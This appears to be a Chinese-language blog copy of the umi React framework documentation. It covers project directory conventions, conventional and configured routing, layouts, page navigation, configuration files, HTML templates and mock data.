<p>如果有 layouts/index.js，那么路由就会变为：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; path: '/', component: './layouts/index', routes: [</span><br><span class="line">    &#123; path: '/', component: './pages/index' &#125;,</span><br><span class="line">    &#123; path: '/users', component: './pages/users' &#125;,</span><br><span class="line">  ] &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="src-pages"><a href="#src-pages" class="headerlink" title="src/pages"></a>src/pages</h2><p>注：配置式路由下无效。</p>
<p>约定 pages 下所有的 js、jsx、ts 和 tsx 文件即路由。关于更多关于约定式路由的介绍，请前往路由章节。</p>
<h2 id="src-pages-404-js"><a href="#src-pages-404-js" class="headerlink" title="src/pages/404.js"></a>src/pages/404.js</h2><p>404 页面。注意开发模式下有内置 umi 提供的 404 提示页面，所以只有显式访问 /404 才能访问到这个页面。</p>
<h2 id="src-pages-document-ejs"><a href="#src-pages-document-ejs" class="headerlink" title="src/pages/document.ejs"></a>src/pages/document.ejs</h2><p>有这个文件时，会覆盖默认的 HTML 模板。模板里需至少包含根节点的 HTML 信息，<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="src-pages-umi"><a href="#src-pages-umi" class="headerlink" title="src/pages/.umi"></a>src/pages/.umi</h2><p>这是 umi dev 时生产的临时目录，默认包含 umi.js 和 router.js，有些插件也会在这里生成一些其他临时文件。可以在这里做一些验证，但请不要直接在这里修改代码，umi 重启或者 pages 下的文件修改都会重新生成这个文件夹下的文件。</p>
<h2 id="src-pages-umi-production"><a href="#src-pages-umi-production" class="headerlink" title="src/pages/.umi-production"></a>src/pages/.umi-production</h2><p>同 src/pages/.umi，但是是在 umi build 时生成的，umi build 执行完自动删除。</p>
<h2 id="test-js-ts-和-e2e-js-ts"><a href="#test-js-ts-和-e2e-js-ts" class="headerlink" title=".test.(js|ts) 和 .e2e.(js|ts)"></a>.test.(js|ts) 和 .e2e.(js|ts)</h2><p>测试文件，umi test 会查找所有的 .test.js 和 .e2e.js 文件来跑测试。</p>
<h2 id="src-global-js-ts"><a href="#src-global-js-ts" class="headerlink" title="src/global.(js|ts)"></a>src/global.(js|ts)</h2><p>此文件会在入口文件的最前面被自动引入，可以在这里加载补丁，做一些初始化的操作等。</p>
<p>src/global.(css|less|sass|scss)<br>此文件不走 css modules，且会自动被引入，可以在这里写全局样式，以及做样式覆盖。</p>
<h2 id="src-app-js-ts"><a href="#src-app-js-ts" class="headerlink" title="src/app.(js|ts)"></a>src/app.(js|ts)</h2><p>运行时配置文件，可以在这里扩展运行时的能力，比如修改路由、修改 render 方法等。</p>
<h2 id="umirc-js-ts-和-config-config-js-ts"><a href="#umirc-js-ts-和-config-config-js-ts" class="headerlink" title=".umirc.(js|ts) 和 config/config.(js|ts)"></a>.umirc.(js|ts) 和 config/config.(js|ts)</h2><p>编译时配置文件，二选一，不可共存。</p>
<h2 id="env"><a href="#env" class="headerlink" title=".env"></a>.env</h2><p>环境变量配置文件，比如：</p>
<p>CLEAR_CONSOLE=none<br>BROWSER=none</p>
<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p>下文介绍的路由使用可以在 umi-examples/routes 和 umi-examples/routes-via-config 里找到示例代码。</p>
<p>umi 会根据 pages 目录自动生成路由配置。</p>
<h2 id="约定式路由"><a href="#约定式路由" class="headerlink" title="约定式路由"></a>约定式路由</h2><p>基础路由</p>
<p>假设 pages 目录结构如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+ pages/</span><br><span class="line">  + users/</span><br><span class="line">    - index.js</span><br><span class="line">    - list.js</span><br><span class="line">  - index.js</span><br></pre></td></tr></table></figure></p>
<p>那么，umi 会自动生成路由配置如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; path: '/', component: './pages/index.js' &#125;,</span><br><span class="line">  &#123; path: '/users/', component: './pages/users/index.js' &#125;,</span><br><span class="line">  &#123; path: '/users/list', component: './pages/users/list.js' &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>umi 里约定，带 $ 前缀的目录或文件为动态路由。<br>比如以下目录结构：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+ pages/</span><br><span class="line">  + $post/</span><br><span class="line">    - index.js</span><br><span class="line">    - comments.js</span><br><span class="line">  + users/</span><br><span class="line">    $id.js</span><br><span class="line">  - index.js</span><br></pre></td></tr></table></figure></p>
<p>会生成路由配置如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; path: '/', component: './pages/index.js' &#125;,</span><br><span class="line">  &#123; path: '/users/:id', component: './pages/users/$id.js' &#125;,</span><br><span class="line">  &#123; path: '/:post/', component: './pages/$post/index.js' &#125;,</span><br><span class="line">  &#123; path: '/:post/comments', component: './pages/$post/comments.js' &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="可选的动态路由"><a href="#可选的动态路由" class="headerlink" title="可选的动态路由"></a>可选的动态路由</h2><p>umi 里约定动态路由如果带 $ 后缀，则为可选动态路由。<br>比如以下结构：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+ pages/</span><br><span class="line">  + users/</span><br><span class="line">    - $id$.js</span><br><span class="line">  - index.js</span><br></pre></td></tr></table></figure></p>
<p>会生成路由配置如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/'</span>: component: <span class="string">'./pages/index.js'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/users/:id?'</span>: component: <span class="string">'./pages/users/$id$.js'</span> &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h2><p>umi 里约定目录下有 _layout.js 时会生成嵌套路由，以 _layout.js 为该目录的 layout 。<br>比如以下目录结构：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ pages/</span><br><span class="line">  + users/</span><br><span class="line">    - _layout.js</span><br><span class="line">    - $id.js</span><br><span class="line">    - index.js</span><br></pre></td></tr></table></figure></p>
<p>会生成路由配置如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/users'</span>, <span class="attr">component</span>: <span class="string">'./pages/users/_layout.js'</span>,</span><br><span class="line">    routes: [</span><br><span class="line">     &#123; <span class="attr">path</span>: <span class="string">'/users/'</span>, <span class="attr">component</span>: <span class="string">'./pages/users/index.js'</span> &#125;,</span><br><span class="line">     &#123; <span class="attr">path</span>: <span class="string">'/users/:id'</span>, <span class="attr">component</span>: <span class="string">'./pages/users/$id.js'</span> &#125;,</span><br><span class="line">   ],</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>全局 layout<br>约定 src/layouts/index.js 为全局路由，返回一个 React 组件，通过 props.children 渲染子组件。<br>比如：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;Header /&gt;</span><br><span class="line">      &#123; props.children &#125;</span><br><span class="line">      &lt;Footer /&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="不同的全局-layout"><a href="#不同的全局-layout" class="headerlink" title="不同的全局 layout"></a>不同的全局 layout</h2><p>你可能需要针对不同路由输出不同的全局 layout，umi 不支持这样的配置，但你仍可以在 layouts/index.js 对 location.path 做区分，渲染不同的 layout 。</p>
<p>比如想要针对 /login 输出简单布局，<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (props.location.pathname === <span class="string">'/login'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">SimpleLayout</span>&gt;</span>&#123; props.children &#125;<span class="tag">&lt;/<span class="name">SimpleLayout</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;Header /&gt;</span><br><span class="line">      &#123; props.children &#125;</span><br><span class="line">      &lt;Footer /&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="404-路由"><a href="#404-路由" class="headerlink" title="404 路由"></a>404 路由</h2><p>约定 pages/404.js 为 404 页面，需返回 React 组件。</p>
<p>比如：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;I am a customized <span class="number">404</span> page&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure></p>
<p>注意：开发模式下，umi 会添加一个默认的 404 页面来辅助开发，但你仍然可通过精确地访问 /404 来验证 404 页面。</p>
<h2 id="通过注释扩展路由"><a href="#通过注释扩展路由" class="headerlink" title="通过注释扩展路由"></a>通过注释扩展路由</h2><p>约定路由文件的首个注释如果包含 yaml 格式的配置，则会被用于扩展路由。<br>比如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ pages/</span><br><span class="line">  - index.js</span><br></pre></td></tr></table></figure></p>
<p>如果 pages/index.js 里包含：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * title: Index Page</span><br><span class="line"> * Routes:</span><br><span class="line"> *   - ./src/routes/a.js</span><br><span class="line"> *   - ./src/routes/b.js</span><br><span class="line"> */</span><br></pre></td></tr></table></figure></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> [</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">component</span>: <span class="string">'./index.js'</span>,</span><br><span class="line">    title: <span class="string">'Index Page'</span>,</span><br><span class="line">    Routes: [ <span class="string">'./src/routes/a.js'</span>, <span class="string">'./src/routes/b.js'</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="配置式路由"><a href="#配置式路由" class="headerlink" title="配置式路由"></a>配置式路由</h2><p>如果你倾向于使用配置式的路由，可以配置 routes ，此配置项存在时则不会对 src/pages 目录做约定式的解析。<br>比如：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">component</span>: <span class="string">'./a'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">'/list'</span>, <span class="attr">component</span>: <span class="string">'./b'</span>, <span class="attr">Routes</span>: [<span class="string">'./routes/PrivateRoute.js'</span>] &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">'/users'</span>, <span class="attr">component</span>: <span class="string">'./users/_layout'</span>,</span><br><span class="line">      routes: [</span><br><span class="line">        &#123; <span class="attr">path</span>: <span class="string">'/users/detail'</span>, <span class="attr">component</span>: <span class="string">'./users/detail'</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">path</span>: <span class="string">'/users/:id'</span>, <span class="attr">component</span>: <span class="string">'./users/id'</span> &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>注意：component 是相对于 src/pages 目录的</p>
<h2 id="权限路由"><a href="#权限路由" class="headerlink" title="权限路由"></a>权限路由</h2><p>umi 的权限路由是通过配置路由的 Routes 属性来实现。约定式的通过 yaml 注释添加，配置式的直接配上即可。</p>
<p>比如有以下配置：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">component</span>: <span class="string">'./pages/index.js'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/list'</span>, <span class="attr">component</span>: <span class="string">'./pages/list.js'</span>, <span class="attr">Routes</span>: [<span class="string">'./routes/PrivateRoute.js'</span>] &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>然后 umi 会用 ./routes/PrivateRoute.js 来渲染 /list。<br>./routes/PrivateRoute.js 文件示例：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (props) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;div&gt;PrivateRoute (routes/PrivateRoute.js)&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &#123; props.children &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>路由动效<br>路由动效应该是有多种实现方式，这里举 react-transition-group 的例子。<br>先安装依赖，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yarn add react-transition-group</span><br></pre></td></tr></table></figure></p>
<p>在 layout 组件（layouts/index.js 或者 pages 子目录下的 _layout.js）里在渲染子组件时用 TransitionGroup 和 CSSTransition 包裹一层，并以 location.pathname 为 key，<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> withRouter <span class="keyword">from</span> <span class="string">'umi/withRouter'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TransitionGroup, CSSTransition &#125; <span class="keyword">from</span> <span class="string">"react-transition-group"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> withRouter(</span><br><span class="line">  (&#123; location &#125;) =&gt;</span><br><span class="line">    &lt;TransitionGroup&gt;</span><br><span class="line">      &lt;CSSTransition key=&#123;location.pathname&#125; classNames=<span class="string">"fade"</span> timeout=&#123;<span class="number">300</span>&#125;&gt;</span><br><span class="line">        &#123; children &#125;</span><br><span class="line">      &lt;<span class="regexp">/CSSTransition&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>TransitionGroup&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>上面用到的 fade 样式，可以在 src 下的 global.css 里定义：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.fade-enter</span><span class="selector-class">.fade-enter-active</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">250ms</span> ease-in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="面包屑"><a href="#面包屑" class="headerlink" title="面包屑"></a>面包屑</h2><p>面包屑也是有多种实现方式，这里举 react-router-breadcrumbs-hoc 的例子。<br>先安装依赖，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yarn add react-router-breadcrumbs-hoc</span><br></pre></td></tr></table></figure></p>
<p>然后实现一个 Breakcrumbs.js，比如：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> NavLink <span class="keyword">from</span> <span class="string">'umi/navlink'</span>;</span><br><span class="line"><span class="keyword">import</span> withBreadcrumbs <span class="keyword">from</span> <span class="string">'react-router-breadcrumbs-hoc'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更多配置请移步 https://github.com/icd2k3/react-router-breadcrumbs-hoc</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">breadcrumb</span>: <span class="string">'首页'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/list'</span>, <span class="attr">breadcrumb</span>: <span class="string">'List Page'</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> withBreadcrumbs(routes)(<span class="function">(<span class="params">&#123; breadcrumbs &#125;</span>) =&gt;</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &#123;breadcrumbs.map(<span class="function">(<span class="params">breadcrumb, index</span>) =&gt;</span> (</span><br><span class="line">      &lt;span key=&#123;breadcrumb.key&#125;&gt;</span><br><span class="line">        &lt;NavLink to=&#123;breadcrumb.props.match.url&#125;&gt;</span><br><span class="line">          &#123;breadcrumb&#125;</span><br><span class="line">        &lt;<span class="regexp">/NavLink&gt;</span></span><br><span class="line"><span class="regexp">        &#123;(index &lt; breadcrumbs.length - 1) &amp;&amp; &lt;i&gt; /</span> &lt;<span class="regexp">/i&gt;&#125;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>span&gt;</span><br><span class="line">    ))&#125;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">));</span></span><br></pre></td></tr></table></figure></p>
<p>然后在需要的地方引入此 React 组件即可。</p>
<h2 id="启用-Hash-路由"><a href="#启用-Hash-路由" class="headerlink" title="启用 Hash 路由"></a>启用 Hash 路由</h2><p>umi 默认是用的 Browser History，如果要用 Hash History，需配置：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  history: <span class="string">'hash'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Scroll-to-top"><a href="#Scroll-to-top" class="headerlink" title="Scroll to top"></a>Scroll to top</h2><p>在 layout 组件（layouts/index.js 或者 pages 子目录下的 _layout.js）的 componentDidUpdate 里决定是否 scroll to top，比如：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> withRouter <span class="keyword">from</span> <span class="string">'umi/withRouter'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Layout</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentDidUpdate(prevProps) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.location !== prevProps.location) &#123;</span><br><span class="line">      <span class="built_in">window</span>.scrollTo(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.props.children;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> withRouter(Layout);</span><br></pre></td></tr></table></figure></p>
<h2 id="在页面间跳转"><a href="#在页面间跳转" class="headerlink" title="在页面间跳转"></a>在页面间跳转</h2><p>在 umi 里，页面之间跳转有两种方式：声明式和命令式。</p>
<h2 id="声明式"><a href="#声明式" class="headerlink" title="声明式"></a>声明式</h2><p>基于 umi/link，通常作为 React 组件使用。<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Link <span class="keyword">from</span> <span class="string">'umi/link'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; (</span><br><span class="line">  &lt;Link to=<span class="string">"/list"</span>&gt;Go to list page&lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure></p>
<h2 id="命令式"><a href="#命令式" class="headerlink" title="命令式"></a>命令式</h2><p>基于 umi/router，通常在事件处理中被调用。<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'umi/router'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goToListPage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  router.push(<span class="string">'/list'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>更多命令式的跳转方法，详见 api#umi/router。</p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>umi 允许在 .umirc.js 或 config/config.js （二选一，.umirc.js 优先）中进行配置，支持 ES6 语法。</p>
<p>为简化说明，后续文档里只会出现 .umirc.js。</p>
<p>比如：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  base: <span class="string">'/admin/'</span>,</span><br><span class="line">  publicPath: <span class="string">'http://cdn.com/foo'</span>,</span><br><span class="line">  plugins: [</span><br><span class="line">    [<span class="string">'umi-plugin-react'</span>, &#123;</span><br><span class="line">      dva: <span class="literal">true</span>,</span><br><span class="line">    &#125;],</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>具体配置项详见配置。</p>
<h2 id="umirc-local-js"><a href="#umirc-local-js" class="headerlink" title=".umirc.local.js"></a>.umirc.local.js</h2><p>.umirc.local.js 是本地的配置文件，不要提交到 git，所以通常需要配置到 .gitignore。如果存在，会和 .umirc.js 合并后再返回。</p>
<h2 id="UMI-ENV"><a href="#UMI-ENV" class="headerlink" title="UMI_ENV"></a>UMI_ENV</h2><p>可以通过环境变量 UMI_ENV 区分不同环境来指定配置。<br>举个例子，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// .umirc.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .umirc.cloud.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; <span class="attr">b</span>: <span class="string">'cloud'</span>, <span class="attr">c</span>: <span class="string">'cloud'</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .umirc.local.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; <span class="attr">c</span>: <span class="string">'local'</span> &#125;;</span><br></pre></td></tr></table></figure></p>
<p>不指定 UMI_ENV 时，拿到的配置是：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: <span class="number">2</span>,</span><br><span class="line">  c: <span class="string">'local'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>指定 UMI_ENV=cloud 时，拿到的配置是：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: <span class="string">'cloud'</span>,</span><br><span class="line">  c: <span class="string">'local'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="HTML-模板"><a href="#HTML-模板" class="headerlink" title="HTML 模板"></a>HTML 模板</h1><h2 id="修改默认模板"><a href="#修改默认模板" class="headerlink" title="修改默认模板"></a>修改默认模板</h2><p>新建 src/pages/document.ejs，umi 约定如果这个文件存在，会作为默认模板，内容上需要保证有 <div id="root"></div>，比如：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Your App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="配置模板"><a href="#配置模板" class="headerlink" title="配置模板"></a>配置模板</h2><p>模板里可通过 context 来获取到 umi 提供的变量，context 包含：<br>.route，路由对象，包含 path、component 等<br>.config，用户配置信息<br>.publicPath2.1.2+，webpack 的 output.publicPath 配置<br>.env，环境变量，值为 development 或 production<br>.其他在路由上通过 context 扩展的配置信息</p>
<p>模板基于 ejs 渲染，可以参考 <a href="https://github.com/mde/ejs" target="_blank" rel="noopener">https://github.com/mde/ejs</a> 查看具体使用。<br>比如输出变量，<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> <span class="attr">href</span>=<span class="string">"&lt;%= context.publicPath %&gt;favicon.png"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>比如条件判断，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% if(context.env === &apos;production&apos;) &#123; %&gt;</span><br><span class="line">  &lt;h2&gt;生产环境&lt;/h2&gt;</span><br><span class="line">&lt;% &#125; else &#123;%&gt;</span><br><span class="line">  &lt;h2&gt;开发环境&lt;/h2&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="针对特定页面指定模板"><a href="#针对特定页面指定模板" class="headerlink" title="针对特定页面指定模板"></a>针对特定页面指定模板</h2><p>WARNING<br>此功能需开启 exportStatic 配置，否则只会输出一个 html 文件。<br>TIP</p>
<p>优先级是：路由的 document 属性 &gt; src/pages/document.ejs &gt; umi 内置模板</p>
<p>配置路由的 document 属性。比如约定式路由可通过注释扩展 document 属性，路径从项目根目录开始找，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * document: ./src/documents/404.ejs</span><br><span class="line"> */</span><br></pre></td></tr></table></figure></p>
<p>然后这个路由就会以 ./src/documents/404.ejs 为模板输出 HTML。</p>
<h2 id="Mock-数据"><a href="#Mock-数据" class="headerlink" title="Mock 数据"></a>Mock 数据</h2><p>Mock 数据是前端开发过程中必不可少的一环，是分离前后端开发的关键链路。通过预先跟服务器端约定好的接口，模拟请求数据甚至逻辑，能够让前端开发独立自主，不会被服务端的开发所阻塞。</p>
<h2 id="使用-umi-的-mock-功能"><a href="#使用-umi-的-mock-功能" class="headerlink" title="使用 umi 的 mock 功能"></a>使用 umi 的 mock 功能</h2><p>umi 里约定 mock 文件夹下的文件或者 page(s) 文件夹下的 _mock 文件即 mock 文件，文件导出接口定义，支持基于 require 动态分析的实时刷新，支持 ES6 语法，以及友好的出错提示，详情参看 mock-data。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// 支持值为 Object 和 Array</span></span><br><span class="line">  <span class="string">'GET /api/users'</span>: &#123; <span class="attr">users</span>: [<span class="number">1</span>, <span class="number">2</span>] &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET POST 可省略</span></span><br><span class="line">  <span class="string">'/api/users/1'</span>: &#123; <span class="attr">id</span>: <span class="number">1</span> &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 支持自定义函数，API 参考 express@4</span></span><br><span class="line">  <span class="string">'POST /api/users/create'</span>: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; res.end(<span class="string">'OK'</span>); &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>当客户端（浏览器）发送请求，如：GET /api/users，那么本地启动的 umi dev 会跟此配置文件匹配请求路径以及方法，如果匹配到了，就会将请求通过配置处理，就可以像样例一样，你可以直接返回数据，也可以通过函数处理以及重定向到另一个服务器。</p>
